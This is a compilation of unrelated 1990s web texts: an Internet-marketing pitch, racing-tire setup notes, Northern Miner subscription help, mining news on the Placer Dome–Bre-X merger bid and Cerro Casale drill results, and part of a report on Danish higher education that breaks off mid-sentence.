The Internetis rapidly becoming the greatest marketplace in the world. It is aninternational network of computer systems that allows anyone with a homecomputer to connect with other computers, across town or around the worldto gain access to information, and to communicate economically for nearlyevery purpose imaginable. It is estimated that there are already between40 to 50 million people on the Internet today, and that number is growingby thousands each week. America On Line reports an average of nearly10,000 new members each week. And Microsoft recently announced that525,000 new members joined the Microsoft Online service in its first3 months of operation. Prodigy, Compuserve, Earthlink, and an accountednumber of local Internet access providers scattered across the world addeven more to these numbers everyday. Ned Lautenbach, Senior VP and GroupExecutive of IBM, speaking of the dramatic growth of the Internet, recentlypredicted that "based on current exponential growth, over one billion peoplemaybe online by the year 2000." Although it is difficult to get exactfigures as to the number of people currently on it; it is fair to saythat nearly everyone will soon have access to the Internet with homecomputers connected to it more than televisions are connected to cable. What do these all mean to you, the business owner?You now have a verygood opportunity to reach this rapidly growing market. Having aprofessionally looking home page is not enough!

Welcome To Joe Torrisi's Tech Page The following are my personal notes based on articles, experiences and observations duringmy involvement with auto racing. Hope You Enjoy... I Welcome Your Input and Comments....... Tires: Racing tires... are designed for one purpose and that is to be "used up". Getting the most out of tire in the primarygoal. All tires have an ideal operating temperature, inflation level and slip angle for optimum performance. We willonly address tire issues here so lets assume no negative chassis influences. To obtain maximum adhesiona tire should be run at an inflation level that allows the tire to be flat to the track. Underinflation andOverinflation can cause a concave or convex tire patch __---__ or ---__--- Temps like this: 200 215 200show an Overinflated tire. Underinflation looks like this: 225 200 225 . Notice how the entire temp ofthe underinflated tire increases. Understand that a tire has both internal and external friction causingheat [one other source is brakes we'll talk bout that later]. Reducing air pressure increases internal friction raising temperature and of course the opposite is true.Always mount tires with the arrow in the proper direction, internal construction of bias tires have the belts running in a specific direction so deflection of the tread width does not occur under load.Running backwards can cause deformation and delamination of the tire. Getting the tires in theproper temperature range can be done by stiffining or softening springs or roll bars and to lesser degree raising or lowering tire pressures. Stiffer springs and lower air pressure will increase temps.and visa versa. External friction... is generated by slip angle. Slip angle is the difference between the track and the tire.it occurs in all lateral directions depending on acceleration, deceleration and turning. The key iscontrolling slip angle within the tires operating parameters. Too much slip angle will result in highertire temps and excessive tire wear. And too little will result in a cold tire that will last forever. Both ofthese instances will result in poor traction in all lateral directions. So we must operate whithin thoseextremes at all times. The ideal slip angle is one that works for the tire. Racers have no control overwhere that tire is most efficient, that is done in the design and manufacturing process. All we can dois set our chassis to not exceed these ranges. Pressure... can be regulated many ways for desired effect. But maintaining consistant temps acrossthe face should be a major consideration. You can and should use tire pressure for tuning your racer.First things first tires, as we discussed, build heat and air pressure will increase as tire temps goes up.It's important not to let that pressure build up deform our contact patch. There are several ways to dothis the first is obvious, start with less air pressure to get the desired air pressure at operating temps.The second is with bleed off valves that keep a tire pressure consistant regardless of increasingtemps. And of coarse you can use a gas that is inert to heat such as nitrogen, however some o2 isalways in the tire (unless you live in space) and some pressure build is imminent. Stagger...The more air in a tire the larger its circumference A larger tire on the outside of the carmakes up for the difference in distance the inside is traveling as opposed to the outside tires.Stagger should be used but kept to a minimum. Too much can eat HP down the straights and make the car loose going in. However if you need to transition the car fast such as a sprinter ordirt car or your on a very tight short ashphalt track get all you can by lowering left rear tire pressures. If you want to close the stagger up on longer runs try nitrogen on the rights and air on the lefts. Spring rate... is effected by tire pressure as well. The side wall of a tire is also a spring and as suchcan be utilized as a tuning tool. Changing several pounds of air pressure in a tire will change theplyablity of the sidewall and change the effective spring rate. This is even more evident with theradial tire, 1 pound of air can change the spring rate as much as 25#s per inch. This is because aradial tire is constructed with the belts running vertical causing centrifical force to stiffen the sidewall as the tire goes faster. This is not as drastic in bias ply tires because of their diaganal placementof the belts but it still occurs. Look at a dragster tire, it grows tremendesly under acceleration. Chassis height... and therefore wheel weight are also effected by tire pressure due to changes incircumferences. More or less air raises or lowers the chassis and adds or removes wheel weight.So if you need to tighten a car up a little put a few extra pounds in the RF and LR and of coarsethe opposite would be true. This also makes an adjustment in stagger at the same time that willalso tighten the car up a bit. You tell me what the next article should be about ! What do you think?

A dedicated or dial up TCP/IP Internet connection (a shell account will not work). A graphical WWW browser such as Netscape 2.0 (recommended) or Microsoft Internet Explorer that can display tables and graphics. The Northern Miner Home page contains a link to the Netscape down load site which allows you to obtain the most recent version of Netscape. How to use the Northern Miner WWW Product Contact The Northern Miner circulation department as described in the WWWproduct announcement and the newspaper insert to order the service. You will be assigned a User Name and Password that you need to access the service. These are for your use only. Do not give this information to other people. Point your WWW browser at the Northern Miner Home page URL and click on the Subscription WWW Service link. You will be prompted to enter the User Name and Password that you obtained from the Northern Miner circulation department. Enter these into the dialog box and click on the OK button. You are now in the Subscription WWW Service home page. The page consists of the following: The date and time that the page was last updated. A link back to the Northern Miner Home page. A link to a page containing a links to all the issues. Short cut links directly to the current and back issues. A link to the Company Index page for each letter of the alphabet. Each company has a page that contains links to all the articles that the company is referenced in. For example, to find all the articles that reference Noranda, click on the n link. All Subscription WWW Service pages have the same general structure. All pages contain back links to all the lower levels, right back to the Northern Miner home page, so you can navigate back to any point without having to visit the intervening pages. The WWW browser navigation buttons work as well. Each issue consists of a page with a list of all the headlines in the issue. Each headline is a link to the text of the article. Each article page contains the headline and full text of the newspaper article. As well, you can navigate directly to the Previous Article and Next Article. Each reference to a company in an article is a link back to the company page, which contains links to all the articles that the company has been referenced in. What to do when you can't access the Northern Miner WWW Product Verify that your Internet connection to your ISP is working. This is by far the most common cause of problems. Verify that your modem and phone line are working. Even if your Internet connection is working, problems in other parts of the Internet may prevent you from reaching the Northern Miner WWW site. Contact your ISP help desk to find out what the current status of their network and their link to the Internet is. If the User Name and Password that you enter into the dialog box are not accepted, first verify that they are correct. Most User Names and Passwords assigned by the Northern Miner are in lower case, so if you entered them in UPPER case, then try again using lower case. If still not accepted then contact the Northern Miner circulation department to verify the User Name and Password. If the Subscription WWW Service home page is the same as last week and the new issue has been published (that is it's after 12:00 EST on Friday) then (this example for Netscape only) select the Options menu item and then the Network Preferences menu item. Then select Cache and click on the Clear Memory Cache Now and Clear Disk Cache Now buttons. In general, you should configure you WWW browser to cache pages for less than 7 days. What you need to access the Northern Miner EMAIL Product An Internet EMAIL address (of the form name@organization.domain). I'm new to this Internet stuff. What do I need to get Internet Access? A Windows or Windows 95 PC, a Macintosh (Power PC or 68000) or Unix computer running the X Window system. 8 megabytes of memory or more is recommended. For dial up service you need a 14.4 or 28.8 modem. An Internet Access software package: For Windows 3.1 we suggest Internet in a Box, available at most computer stores. Windows 95 Internet access is available using the Remote Access (RAS) product. For the Macintosh we suggest The Internet Starter Kit, by Adam C. Engst., published by Hayden Books. You need an Internet Service Provider (ISP) to provide Internet access. There are several national organizations such as Compuserve or America Online that provide this service. There are also local ISPs in most areas.

Deprived of a chance to make a deal with Bre-X Minerals (BXM-T) to developthe gold deposit in East Kalimantan, Placer Dome is offering Bre-X a mergeron essentially equal terms. Placer made its bid in a Jan. 13 letter to Walsh, inviting Bre-X to opennegotiations for a merger. The letter, signed by Willson, said in part thatPlacer Dome wants "to enter into a tax-effective, stock-for-stock `merger ofequals' at a significant premium to the current market price." The proposedshare swap does not include a cash component. At the close of trading on Jan. 15, Placer Dome shares were valued at $28.10and Bre-X shares at $24.45. A merger offer would likely entail a shareexchange ratio of about one-to-one. Willson suggested the merger offer wouldbe more attractive to Bre-X shareholders than the company's Dec. 16development deal with Barrick. "It will give them the opportunity to decidewhat happens to their company," he said. To qualify for pooling treatment under Canadian accounting rules, thecombined company would have to be owned roughly equally by Placer Dome andBre-X. "In effect, the final ownership of the company has to be within the45-55% range," said Willson. That, in turn, would make Bre-X President DavidWalsh the largest single shareholder in Placer Dome. The merger proposal comes as the Indonesian Ministry of Mines and Energyconsiders the development deal between Bre-X and Barrick, mandated by theMinistry in late November. The government's action -- in effect, handing theproject to Barrick without a bidding process -- brought criticism from theinternational mining industry and from a number of quarters in the country,including environmental organizations and influential businessmen. Barrick'sjoint-venture agreement with an industrial conglomerate headed by IndonesianPresident Suharto's eldest daughter also brought criticism. Willson intimated that Placer Dome had received some signs from thegovernment that other bidders might be considered after all. "We have senseda desire by the Indonesians to do this thing in the right way, and mostrecently have received some encouragement." Willson also asserted that PlacerDome would not be looking for favors in Indonesia: "We don't expect that wewill be making agreements with any people within the Suharto family, orwithin top government circles, for services." The proposal also dangles a 40% net interest for the government and forIndonesian-based minority shareholders in the Busang land package that coversthe Bre-X deposit. One of those companies, Kreung Gasui, has a 10% interestin the Busang Central property and contends that it is entitled to between10% and 30% of the rest of the project. On the day following the release of the Placer proposal, lawyers acting forKreung Gasui and its controlling shareholder, Indonesian businessman JusufMurukh, filed suit in the Alberta Court of Queen's Bench seeking an orderthat Bre-X recognize the company's interest in the larger Busang Southeastproperty. The suit names Bre-X and 19 other parties as respondents, including Bre-Xexecutives David Walsh and John Felderhof, Indonesian partner Askatindo KaryaMineral and two of its principals, and Minorca Resources (MAR-M), which hasan agreement to earn 70% of Askatindo's interest. Central to the claim is Kreung's 10% equity interest in Westralian AtanMinerals, the joint-venture company that Bre-X absorbed when it took up theBusang project in 1993. Kreung maintains that it has an option to acquire anadditional 20% of the joint venture. "The participation in Westralian is keyto the claim to the interest [in Busang Southeast]," said lawyer AleckTrawick of Blake Cassels & Graydon, the firm retained by Kreung. Bre-X's immediate reply to the suit was a press release in which companyPresident David Walsh described the action as "frivolous, completely withoutmerit," and stated the company would contest the action. At presstime,Minorca's president, Roland Horst, said the company had not received anynotice that it, or Askatindo, had been named in the suit. Placer Dome's proposal tries to protect the company against the propertydispute, stating the merger can only go ahead if Bre-X can show "receipt of asuitable Contract of Work, satisfactory resolution of ownership issues, andregulatory and shareholder approvals." Placer stated its willingness to enternegotiations with the Indonesian government and with Bre-X's partners toresolve the ownership claims and to ensure the project will get a Contract ofWork. Because Placer is basing its merger proposal only on publicinformation, the proposal stipulates that Placer can do its own due diligenceinvestigation before the deal closes. Kreung Gasui and Murukh, who had been virtually silent while it appeared thatBarrick had secured Busang, are believed to have picked Alberta as a venuebecause Bre-X is based in Calgary and an order could be enforced thereagainst the company. The plaintiffs could file actions in Indonesian courtsthat might have jurisdiction over the property. But if reports that thegovernment's sentiment is shifting away from the Barrick deal are accurate,court action in Indonesia could be unproductive. Barrick Gold had no comment on the lawsuit but considers the bidding processto be closed and sees no future for other bids. Vice-president Vincent Borgsaid "the Placer proposal misses the mark," adding that "the governmentdecided [on Barrick] based on our superior track record." If the bidding process were to be opened, Newmont Gold (NGC-N), Teck (TEK-T)and Freeport McMoRan Copper and Gold (FCX-N) could also be potential suitorsfor Bre-X. Recent drill results from the property, from two section lines inthe extreme southeastern part of the deposit, returned gold grades mainly inthe 2-to-7-gram-per-tonne range, but also some "bonanza" intersections,including a 396-metre interval grading 12.6 grams. Other drill intersections included 373 metres grading an average of 7.4grams, 347 metres grading 3 grams, and 324 metres grading 5.9 grams. Bre-Xhas not revised the resource figure for the deposit, which stands at 780million tonnes grading 2.3 grams gold (equivalent to 57 million containedounces of gold). Placer's letter to Walsh also sketched out a development plan for Busang,proposing a 4-year construction schedule that would proceed in stages. Withan initial daily capacity of 50,000 tonnes, the project would be expanded50,000 tonnes at a time to a total of 200,000 tonnes per day, providedengineering studies supported the expansion. The first stage would incur aUS$600-million capital cost, and bringing the mine to a 200,000-tonnecapacity is expected to run about US$1.7 billion. Placer believes the construction schedule would allow production as early as1999, since engineering staff can be moved on to the project immediately. Placer also plans to use recent design work from its Las Cristinas project inVenezuela. "There is no question we can handle a 200,000-tonne-per-dayproject," Placer's letter states. "This is a simple mill, a simple process;it's a question of size. There's no new technology, and there's no doubt it'sdo-able. The work that we have been doing to design Cristinas is going togive us an immediate advantage in putting together the 50,000-tonne-per-daymodules." If the bid to develop Busang succeeds, the big Indonesian project will assumetop priority. "Clearly, with a first-class project like this we will be ableto focus on our very best quality assets," said Willson. Placer's Cristinasproject, the Pipeline deposit in Nevada, and the Musselwhite mine in Ontario(a joint venture with TVX Gold [TVX-T]), are all nearing production, sodevelopment at Busang should not interfere with their progress. But projectsat earlier stages, such as Cerro Crucitas in Costa Rica and Donlin Creek inAlaska, may find themselves shuffled aside, at least in the early stages ofdevelopment at Busang. In the meantime, the parties will be waiting for the government's reaction tothe Barrick deal and to Placer's proposal. Willson said the company hadalready placed its proposal to Bre-X before the government: "It's with thepresident and the top ministers . . . It could take weeks, and perhapsmonths."

Owership of the property is shared by Arizona Star Resource (AZS-V) andBema Gold (BGO-T), with 51% and 49% interests, respectively. Their currentdrill program is attempting to confirm the grade of the main porphyry zone. Earlier estimates had suggested the diorite porphyry body averages 800 metresin length and 300 metres in width, with a depth of at least 750 metres. Primary mineralization in the main porphyry has consistently averaged gradesin the range of 0.9 gram gold per tonne and 0.35% copper. The porphyry body outcrops at surface in the form of an oxidized gold depositon the northeastern side of a talus-covered hillside at an elevation of 4,460metres. Based on the previous drilling of more than 200 holes, the oxideportion is estimated to contain an reserve, minable by open-pit methods, of93.8 million tonnes grading 0.65 gram gold. The transition from oxide tosulphide mineralization occurs at a depth of about 300 metres. With four diamond drill rigs currently on site, the partners are attemptingto define the extent of the main porphyry sulphide mineralization, whichremains open to the south and at depth. Results were recently received from 12 deep drill holes, the most significantof which are holes 44 and 48, which are major stepouts to the south. Thevalues encountered in these holes, when combined with results from previouslydrilled hole 30 (382 metres of 1 gram gold and 0.26% copper), indicate themain porphyry zone expands to a 600-metre width over a strike length of atleast 100 metres. Hole 44 was drilled vertically, well south of the outcropping southernboundary. From a depth of 144-300 metres, the hole encountered 156 metresaveraging 0.47 gram gold and 0.38% copper before intersecting 494 metres of1.03 grams gold and 0.29% copper beginning at a depth of 300 metres. The holecontinued to a depth of 1,346 metres, yielding 552 metres of mineralizedvolcanics and porphyry averaging 0.38 gram gold and 0.24% copper. Hole 44 was drilled vertically, well south of the outcropping southernboundary. From a depth of 144-300 metres, the hole encountered 156 metresaveraging 0.47 gram gold and 0.38% copper before intersecting 494 metres of1.03 grams gold and 0.29% copper beginning at a depth of 300 metres. The holecontinued to a depth of 1,346 metres, yielding 552 metres of mineralizedvolcanics and porphyry averaging 0.38 gram gold and 0.24% copper. Hole 44 had been projected to hit the main zone at a depth of about 480metres but instead cut the structure substantially higher up, at a depth of300 metres. This shows that the zone extends much nearer to surface than thecompanies anticipated. Hole 48 stepped out farther to the southwest and intersected 306 metres oflower-grade mineralization between a depth of 132-438 metres averaging 0.4gram gold and 0.11% copper before cutting 388 metres of the main porphyrygrading 0.95 gram gold and 0.28% copper between 438 and 826 metres. The hole then passed through a 236-metre interval of mineralized volcanics ata depth of 826-1,062 metres averaging 0.4 gram gold and 0.21% copper beforeencountering the main porphyry zone again at a depth of 1,062-1,206 metres,returning 144 metres of 0.86 gram gold and 0.31% copper. During a conference call to mining analysts, Thomas Garagan, Bema'svice-president of exploration, alluded to the potential size of the deposit:"It would appear, [based on] these results from holes 44 and 48, that 500million tonnes is probably a conservative estimate. It is certainly headingin the plus direction both at depth and to the south." A further six holes drilled into the main porphyry zone returned resultssimilar to values previously reported. The western end of the porphyry wastested by holes 38, 39 and 42. Hole 39 intersected the western edge,returning 140 metres at a depth of 684-824 metres grading 0.7 gram gold and0.35% copper. No values were reported for holes 38 and 42, which were drilledoutside the main zone. Additional intercepts from the main porphyry zone include: 406 meters grading0.92 gram gold and 0.4% copper between a depth of 488 and 894 metres in hole43; 362 metres grading 0.82 gram gold and 0.34% copper between 554 and 916metres in hole 45; and 402 metres grading 0.94 gram gold and 0.41% copperfrom 570-972 metres in hole 47. Hole 40 initially intersected the southern edge of the mineralized zone at adepth of 278-426 metres, returning 148 metres averaging 0.71 gram gold and0.22% copper. The hole then cut 248 metres of the main zone grading 1.1 gramsgold and 0.43% copper, beginning at a depth of 538 metres. Hole 41, drilled at the eastern end of the porphyry, pulled only low-grademineralization along the zone's edge. Arizona Star and Bema continued to define a zone of higher-grade mineralizedbreccia in the main porphyry zone. Hole 49 intersected 132 metres grading 3.28 grams gold and 1.17% copper at adepth of 434-566 metres. The hole proceeded to pass through a 124-metreinterval of porphyry mineralization and localized dykes grading 0.58 gramgold and 0.35% copper before cutting 90 metres of a central, localized dykesystem containing no significant values. At a depth of 780-984 metres, thehole intersected 204 metres grading 1.01 grams gold and 0.48% copper. Hole 46 missed the targeted breccia zone and instead intersected the southernedge of the porphyry, returning 582 metres of 0.76 gram gold and 0.34% copper. The breccia zone has been intersected previously by drill holes 19 (242.2metres of 4.22 grams gold and 1.14% copper), 23 (174 metres of 1.7 grams goldand 0.23% copper), 25 (176 metres of 2.11 grams gold and 0.5% copper) andRC176 (42 metres of 17.8 grams gold and 1.5% copper). The higher-grade zone remains open along strike both to the east and west,and at depth. It currently measures 100 metres long, 110 metres wide and atleast 200 metres deep. Garagan says that by using more careful mapping techniques and looking at olddrill core, the breccia zone was found to project to surface. Unfortunately,as the breccia passes into the zone of oxidation, the copper -- and, with it,the gold -- has been leached from the breccia, thus lowering the grade in thezone. However, by the very nature of the oxidation process, the metals aretransported downwards and reprecipitated, thus enriching sulphide mineralsalready present -- the ramifications being that, with at least three otherbreccia zones identified in the oxide portion of the deposit, there may bepotential for other higher-grade pockets elsewhere at depth. Given the size of the breccia, its grade and the possibility that it could bemined early in the mine's life, management is considering going undergroundwith a 1-2-km-long drift, which would allow for more tightly spaced drillingon the breccia and the extraction of bulk samples of the breccia and porphyryfor metallurgical testing. Arizona Star and Bema have assembled a preliminary mine model to determinehow deeply they can chase the sulphide mineralization, given the averagegrades. Using model dimensions of 800 metres long by 300 metres wide (and amuch smaller extension to the south at depth than what the partners arecurrently seeing), Bema's vice-president of development and production,Dennis Stansbury, says the deposit can be mined by open-pit methods at depthssubstantially greater than the 750-metre depth that has been talked about. Inthe deepest model, with a depth exceeding 1,000 metres, the stripping ratiois projected at just over 5-to-1. Initial metallurgical tests on a large composite sample, comprising 80sulphide ore samples from various rock types, have yielded no nastysurprises. Using standard flotation techniques, which simulate rougherflotation, recoveries averaged 76% gold and 91% copper in six minutes time. While the partners are still in the middle of doing these tests, recoveriesappear to be optimized by a grind of 90% passing through 100 mesh, a pH(hydrogen ion concentration) of 10.8, and the use of only two standardflotation reagents. Additional tests are attempting to evaluate flotation conditions anddetermine the final concentrate grades and chemistry. Overall gold recovery appears to be boosted by cyanide leaching on theflotation tails. Initial results indicate that half of the gold remaining inthe tails can be recovered. A preliminary gravity separation test recovered nearly 10% of the gold into aconcentrate. Copper assays are pending, but a substantial amount isassociated with the gold. "In our view, the metallurgical results could not have been much morepositive," says Bema President Clive Johnson. "We have what we hoped -- anextremely clean ore, very good, very quick recoveries of gold and copper, andindications that agitation leaching will return even more of the gold." Drilling at Cerro Casale will continue to focus on the southern extension andon infilling the main sulphide zone. In the meantime, the partners have released results from a further 11reverse-circulation holes drilled on the Cerro Roman prospect, 7 km northeastof Cerro Casale. The mineralization occurs at the contact between a central,east-west-trending, barren diorite plug and a fine-grained diorite. Thirty-five holes have now tested the Cerro Roman gold porphyry, extendingthe mineralization under a layer of volcanic cover 400 metres east towardsthe Romancito target. Holes past this point have intersected theunmineralized diorite under a thickening volcanic cover. The cover isexpected to thin again towards Romancito, which outcrops 1.4 km east of CerroRoman. In the latest results, holes 23 and 24 were collared directly on theoutcropping zone. Hole 23 pulled 42 metres of 0.39 gram before intersecting26 metres of 0.92 gram, while hole 24 hit 156 metres of 0.94 gram and 42metres of 0.51 gram. Stepout drilling intersected the following: 144 metres from surface grading0.51 gram gold and 34 metres of 0.89 gram in hole 32; 84 metres of 0.91 gramunder 32 metres of volcanic cover in hole 33; 78 metres of 0.98 gram under 38metres of cover in hole 25; 204 metres of 0.63 gram under 38 metres of coverin hole 31; 136 metres of 0.7 gram under 64 metres of cover in hole 22; 18metres of 1.47 grams under 94 metres of cover in hole 26; 118 metres of 1.07grams under 64 metres of cover in hole 28; and 30 metres of 1.05 grams under76 metres of cover in hole 29. Preliminary metallurgical tests on oxide and sulphide material from CerroRoman indicate that both types would be amenable to cyanide heap-leachrecovery methods, with an average gold recovery of 79%. Two holes also tested the newly discovered Jotabeche porphyry, situated 2 kmnortheast of Cerro Roman and 1.5 km north of Romancito. The first holeencountered 28 metres from surface grading 0.48 gram, 40 metres at a depth of78-118 metres grading 0.34 gram, and 56 metres at 118-174 metres grading 1.23grams. The second hole pulled 12 metres from a depth of 34-46 metres grading 0.42gram, 16 metres of 1.28 grams at 46-62 metres, and 48 metres at 138-186metres grading 0.58 gram. Arizona Star and Bema believe the three outcropping porphyries may be part ofthe same large mineralized system. Drilling is set to resume at Jotabeche.

John Steele, Manager Southeast Asia, Yorkton Securities Inc. 9:20 KEY NOTE ADDRESS - THE BRE-X STORY As one of the most spectacular mining success storie s in recent history, the discovery of the rich Busang gold deposit in Indonesia has catapulte d Bre-X Minerals from a small junior company into one of the largest companies in the gold mining sector in terms of market capitalization.

Number and size of institutions 6.1. Historical Overview In 1479, King Christian I got the Pope's permission to establish the University of Copenhagen. And it was for nearly 400 years the only higher education institution in Denmark, but during the 19th century a number of specialised institutions were established, i.a. the Technical University of Denmark, the Royal Veterinary and Agricultural University, the Royal Dental College and the Royal Danish School of Pharmacy. The remaining higher education institutions in the university sector all originate in this century. 6.2. Specific Legislative Framework The legislative basis for the courses at universities and other higher education institutions in the university sector is the University Act of 1993, which authorises the Ministry to lay down regulations for the courses. The University Act does not contain any provisions regarding the structure and content of the courses. Corresponding framework regulations exist for other higher education institutions. The Ministry of Education lays down general guidelines for the individual courses in education orders which contain general provisions regarding the aims, duration, structure, main content, examinations etc. For some courses, the education orders contain rather detailed provisions regarding the organisation of the courses, but a great and ever increasing part of the orders are framework orders which merely lay down the general framework of the courses. In keeping with the framework of the orders, the individual educational institutions draw up a curriculum which describes the content and structure of the individual courses. 6.3. General Description of the Structure of Higher Education Higher education comprises the following categories of education: short-cycle non-university higher education, i.e. furthertechnical and commercial education medium-cycle non-university education medium- and long-cycle university education post-graduate university education (i.e. Ph.D., doctorates) 6.3.1. Short-cycle non-university higher education This heading covers further technical and commercial education courses of 1-2� years' duration. 6.3.1.1. Types of Institutions Apart from a few exceptions, all the further technical and commercial education courses are offered at technical and commercial schools, respectively, i.e. the same schools which offer the vocational education and training courses and the vocational upper secondary courses [see chapter 5], which generally constitute the foundation of the further education courses. 6.3.1.2. Admission requirements In order to be admitted to one of the further technical education courses, students must have completed a vocational education and training course within a field which is relevant for the chosen study programme. Students who have completed a course at general upper secondary level or the ["HTX"] are also eligible for admission, but their course will be extended with 1-1� years (workshop course + practical training in a business). In order to be admitted to one of the further commercial education courses, students must have completed the ["Studentereksamen"], the ["HF"]-examination or the ["HHX"]- or ["HTX"]-examination. In one case, i.e. the "Academy economics" course, students with a completed vocational education and training course in the field of commerce, clerical trades and public administation are also eligible for admission. 6.3.1.3. Branches of Study, Specialisation Further technical and commercial courses are i.a. offered within the following specialisations: electronics, forestry, land surveying, building, textile, graphic design, environmental technology, hospital laboratory work, export technology, commerce, market economics, computer studies etc. 6.3.1.4. General Objectives It is the general objective of the courses that the students acquire competence within the chosen specialisation which qualifies them for participation in and the execution of versatile functions within the given specialisation. The further technical education courses mainly aim at employment which comprises operational, planning and construction tasks. The further commercial education courses aim at independent performance of commercial and administrative functions in trade and industry. 6.3.1.5. Curriculum, Subjects, Number of Hours As curriculum, subjects etc. is not the same for the further technical and the further commercial courses, they are dealt with separately. 6.3.1.5.1. Further technical education The courses are organised in continuation of the initial vocational education and training courses. The instruction is mainly theoretical and takes its point of departure in the knowledge acquired in the initial education. The further technical education courses are normally grouped into areas. The courses comprise teaching of a theoretical and practical nature, including in technological and workshop- or laboratory-technical subjects as well as in general subjects. In addition, there must be teaching in optional subjects, including subjects, which are specially adapted to meet local needs. Further technical education courses within a given area are normally introduced with teaching which is common to the courses of the area. The subsequent teaching is carried out within the individual specialisation. There are also such optional subjects as English, written English, German, technical German. The options vary at the different schools. As an example can be mentioned the 1�-year electronics technicians course which comprises mathematics, edp-application, data communication, quality control, electro-technical subjects, English, economics, business administration, environment, organisation, management etc. 6.3.1.5.2. Further commercial education At this moment, there are still only a few courses under this category, viz. the courses in specialised computer studies, market economics and academy economics. The 2�-year full-time in specialised computer studies is divided into 5 semesters with an overall teaching theme for each semester. The students have to draw up an examination project in the 5th semester. The students acquire skills in solving problems and in finding theories and methods for their solution. It is a course with a great width, where the students are however given a possibility of immersion in one or more specialised areas. The 2-year full-time course in market economics comprises subjects such as foreign languages and cultures, international marketing and international economics, business economics, production organisation, business law, administrative systems and statistics. 6.3.1.6. Methods Examples are given for further technical education and further commercial education. 6.3.1.6.1. Further technical education The teaching is organised so that the general subjects (mathematics, physics, languages etc.) are closely linked to the technical topics, as the teaching focuses on application rather than on pure theory. 6.3.1.6.2. Further commercial education The course in specialised computer studies is divided into 5 semesters with an overall teaching theme for each semester. The first year of the market economics course is divided into 2 semesters, the second year into 3 trimesters. The course is taken within one of the branches: international marketing, logistics or financial control. 6.3.1.7. Student Evaluation Examples are given for further technical education and further commercial education. 6.3.1.7.1. Further technical education Immediately prior to the examination period in the last part of the course, the school decides on each student's eligibility to sit for the final examination. This decision is taken on the basis of an ongoing internal evaluation of the student's participation in and profit gained from the teaching, including the written work handed in by the student. The part-examinations which form part of the final examination are carried out in accordance with the rules laid down in the evaluation plan as course work, which may be carried out in cooperation with a business or in the form of group work as a project, which may be carried out in cooperation with a business or in the form of group work as an oral examination, i.e. a dialogue between the student andthe teacher-examiner as well as an external examiner as a written examination, i.e. individual written paper inresponse to written questions, etc. The evaluation basis is the student's performance at the examination in the given subject. Marks are given according to the 13-point marking scale, and the examination is considered passed, when the sum of all examination marks equals or exceeds the number of examination marks multiplied by 6. 6.3.1.7.2. Further commercial education As the rules regarding evaluation may differ, the market economics course has been chosen as an example: The final examination consists of part-examinations taken after the 2nd semester and after the 1st, the 2nd and the 3rd trimesters. Furthermore, there are two written tests after the 1st semester. Obligatory theme papers are handed in after the 1st and 2nd semesters, and access to the next phases of the course is dependent on a successful evaluation of these papers. External examiners appointed by the Ministry of Education take part in the final examinations. The evaluation is made by the subject-teacher/examiner and the external examiner, and the 13-point marking scale is used for the evaluation. The final examination is considered passed, when the weighted average of all examination marks amounts to at least 6, and no marks below 5 have been given. 6.3.1.8. Promotion, Educational Guidance When a student fails at an examination in the further technical education courses, or fails to register for an examination or chooses to repeat, the school decides which part of the course the student must repeat. It is possible to repeat a part of the course up to 2 times during the course. The student cannot continue on the next part of the course, when the assessments already obtained imply that the examination will not be passed. There are no general rules regarding further commercial education; therefore the market economics course has been used as an example. This course is very strictly regulated and students have to have participated in the teaching to an extent deemed satisfactory by the school and have to have handed in the number of prescribed papers in order to continue on the subsequent semesters of the course. Applicants to and students enrolled in the courses are offered guidance with a view to their choice of education and occupation. In further technical education courses with several specialisations, a student can only supplement the chosen specialisation with another specialisation according to the rules applying to open education. As the further commercial education courses are so few and different from each other, it is not possible to transfer from one branch to another. 6.3.1.9. Certification The school issues a diploma to students who have successfully completed the final examination. According to regulations laid down by the Ministry of Education, the diplomas must contain the following information: 6.3.1.9.1. Further technical education: Title of the course and reference to relevant education act Aim, duration, structure and general admission requirements of the course The marking scale used and criteria for passing the examination Name and logo, if any, and address etc. of school Name and personal registration number or birth date of graduate Date of completion of course or assessment of examination Examination marks obtained by graduate Practical training, if any Date of issue and signature. 6.3.1.9.2. Further commercial education Ex. market economics course: Title of the course with indication of chosen branch and reference to relevant education act Result of examination marks obtained by graduate Name and personal registration number or birth date of graduate Date of completion of course or assessment of examination The marking scale used and criteria for passing the examination Name of school, date of issue and signature. The courses give study competence to pursue studies at higher levels of the education system. 6.3.1.10. Openings, Training-Employment Relationship Some further technical education courses contain a practical training element, whereby the student must spend a certain period of practical training in a business. Guidelines are laid down by the Technical Education Committee regarding the content and possible assessment of the practical training. 6.3.1.11. Special Assistance for Pupils For students with special prerequisites, the examinations are organised under forms and conditions which comply with the prerequisites of the students in accordance with the provisions regarding special educational support. 6.3.2. Medium-Cycle Non-University Higher Education There is a wide range of different courses of this type qualifying for as many professions. Particulars are given under the different headings. But in order to give a more detailed picture, two courses have been singled out as examples: the nursing education and the social work education. 6.3.2.1. Types of Institutions The medium-cycle non-university higher education courses are offered by a great number of different specialised institutions of varying size: schools of social work, schools of midwifery, schools of occupational therapy, schools of physiotherapy, schools of hospital laboratory work, schools of journalism, schools of film production, schools of nursing, colleges of education etc. 6.3.2.2. Admission Requirements The general admission requirements for all the courses is the completion of one of the qualifying examinations at upper secondary level: the ["Studentereksamen"] the ["H�jere Forberedelseseksamen"] the ["H�jere Handelseksamen"], or the ["H�jere Teknisk Eksamen"]. Some schools, e.g. the film school and the school of journalism have their own aptitude tests. But in general, students are granted admission on the basis of the average mark obtained at the final examination at upper secondary level. Finally, there may be a number of special requirements regarding certain subjects at high level, work experience etc. 6.3.2.3. Branches of Study, Specialisation The branches of study and specialisations at this level may be: social work, midwifery, occupational therapy, physiotherapy, hospital laboratory work, nursing, journalism, film production, educator, ["Folkeskole"]-teacher etc. 6.3.2.4. General Objectives There are no general objectives covering this whole area of education, but the education orders for the individual courses each contain a section with the aims of the particular course. Ex. Order on the Training of Nurses: "It is the aim of the course that the student develops and acquires personal and professional qualifications to practice as a nurse. It is furthermore the aim that the student acquires the prerequisites for cooperation, for professional innovation in step with the scientific and social development as well as for the development of the nursing profession." Ex. Order on the Training of Social Workers: "It is the aim of the course to qualify the student to assume the functions of a social worker within the social work area in State, municipal, county and private administrations, institutions and businesses as well as to provide the students with a basis for following the development within this area." 6.3.2.5. Curriculum, Subjects, Number of Hours As examples have been chosen the nursing education and the education of social workers. 6.3.2.5.1. Nursing The nursing course is of 45 months' duration and consists of theoretical education and clinical education. The course is divided into 3 parts, each of 1-1� years' duration. The course comprises education in the role of the nurse in promotion and maintenance of health, prevention, treatment, palliation and rehabilitation. The education is organised in such a way that the initial part comprises the 